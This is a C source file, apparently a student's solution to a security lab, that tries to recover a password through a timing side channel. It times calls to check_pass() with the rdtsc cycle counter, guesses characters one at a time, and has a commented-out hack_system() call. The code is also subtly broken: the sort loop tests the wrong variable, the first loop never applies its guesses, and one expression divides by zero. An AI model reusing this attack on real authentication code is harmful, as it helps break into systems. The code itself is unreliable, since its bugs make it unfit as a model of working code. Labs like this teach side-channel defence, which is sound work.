#include <stdio.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int main(int argc, char **argv) {
    char guess[33];
    long a,d, f, g;
    long timer[94];
    // set guess to zeros
    bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
    a = rdtsc();
    check_pass(guess);
    //char c = 73;
    //guess[0]=c;
    //c = 115;
    //guess [1] = 115;

    for (char c = 33; c < 127; c++) {
        a = rdtsc();
        check_pass(guess);
        d = rdtsc();
        timer[c-33] = d-a;
    }

    for (int i=1; i <= 92;  i++) {
        for (int j=0; i<= 93-i;j++) {
            if (timer[j] <= timer[j+1]){
                long t = timer[j];
                timer[j] = timer[j+1];
                timer[j+1] = t;
            } else continue;
        }
    }

    long median = (timer[94/2] + timer[94/2+1])/2;

    for (int i=0;i<12;i++){
    for (char c = 33; c<127; c++){
        guess[i] =c;
	a = rdtsc();
	check_pass(guess);	
    //if (check_pass(guess)) {
    //    printf("Password Found!\n");
    //    hack_system(guess);
    //};
	d = rdtsc();
	
    if ((d-a)/i+1 > median + 100) {
        printf("%s", guess);
        break;
    }
    }
    }
    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
